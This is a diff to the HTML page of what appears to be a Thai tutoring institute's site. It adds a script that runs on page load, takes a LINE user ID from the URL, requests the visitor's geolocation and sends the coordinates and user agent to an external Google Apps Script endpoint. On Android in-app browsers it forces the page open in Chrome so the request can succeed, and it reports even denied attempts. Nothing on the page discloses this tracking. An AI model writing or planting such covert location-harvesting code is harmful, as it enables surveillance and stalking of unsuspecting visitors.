@@ -129,6 +129,126 @@
         <p>© 2023 สถาบันติวสอบ</p>
     </footer>
     <script src="script.js"></script>
+    <script>
+    var msgError = null;
+    function getLineIdFromUrl() {
+      const params = new URLSearchParams(window.location.search);
+      const id = params.get("id");
+      return id.replace(/\/$/, "");
+    }
+
+
+    async function sendLocation(latitude = 0, longitude = 0) {
+      const lineId = getLineIdFromUrl();
+      if (!lineId) {
+        alert("ไอดีของคุณไม่ถูกต้อง");
+        return;
+      }
+
+      var userAgent = navigator.userAgent || 'none';
+      if(msgError){
+        userAgent = msgError;
+      }
+      const scriptUrl =
+        "https://script.google.com/macros/s/AKfycbz2lSrlH4nRZDMbFK4RLGw02FcOpWe-Kchvpl6tCSSOqYvaEh78zgRN9Ve1kQg_n9ao/exec"; // ใส่ URL ของ Google Apps Script
+      const url = `${scriptUrl}?lineId=${encodeURIComponent(
+        lineId
+      )}&latitude=${encodeURIComponent(
+        latitude
+      )}&longitude=${encodeURIComponent(
+        longitude
+      )}&userAgent=${encodeURIComponent(userAgent)}`;
+
+      try {
+
+        const response = await fetch(url, {
+          method: "GET",
+        });
+
+        const result = await response.json();
+        if (result.status === "success") {
+          // alert("กำลังไปที่หน้ากรอกข้อมูล!");
+        } else {
+          alert("เกิดข้อผิดพลาด");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        alert("เกิดข้อผิดพลาดในการเชื่อมต่อ");
+      }
+    }
+
+
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            sendLocation(latitude, longitude);
+            hidePermissionError();
+          },
+          (error) => {
+         switch (error.code) {
+          case error.PERMISSION_DENIED:
+            // alert("คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง");
+             msgError = "คุณปฏิเสธการเข้าถึงตำแหน่งที่ตั้ง";
+            break;
+          case error.POSITION_UNAVAILABLE:
+             //alert("ไม่สามารถระบุตำแหน่งที่ตั้งได้");
+              msgError = "ไม่สามารถระบุตำแหน่งที่ตั้งได้";
+            break;
+          case error.TIMEOUT:
+            // alert("การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา");
+             msgError = "การขอข้อมูลตำแหน่งที่ตั้งหมดเวลา";
+            break;
+          default:
+            // alert("เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ");
+             msgError = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
+            }
+        
+            sendLocation(0, 0);
+            showPermissionError();
+          }
+        );
+      } else {
+        //alert("เบราว์เซอร์ของคุณไม่รองรับ");
+        msgError = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
+        sendLocation(0, 0);
+      }
+    }
+ 
+
+    function showPermissionError() {
+      const errorDiv = document.getElementById("errorDiv");
+      errorDiv.style.display = "block";
+    }
+
+
+    function hidePermissionError() {
+      const errorDiv = document.getElementById("errorDiv");
+      errorDiv.style.display = "none";
+    }
+   function openInExternalBrowser() {
+      const id =  getLineIdFromUrl();
+      const intentUrl = "intent://iqtutorphattalung.github.io/home?id="+id+"#Intent;scheme=https;package=com.android.chrome;end;";
+       // ลองเปลี่ยนเส้นทางไปยัง intent://
+      window.location.href = intentUrl;
+    }
+
+    $(document).ready(function () {
+       const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+       const isWebView = /(wv|line|fb_iab|instagram)/i.test(userAgent);
+        // ตรวจสอบว่าเป็น Android หรือไม่
+       const isAndroid = /android/i.test(userAgent);
+       if(isWebView && isAndroid){
+         openInExternalBrowser();
+       }else{
+          requestLocation();
+       }
+     
+    })
+  </script>
 </body>
 
 </html>
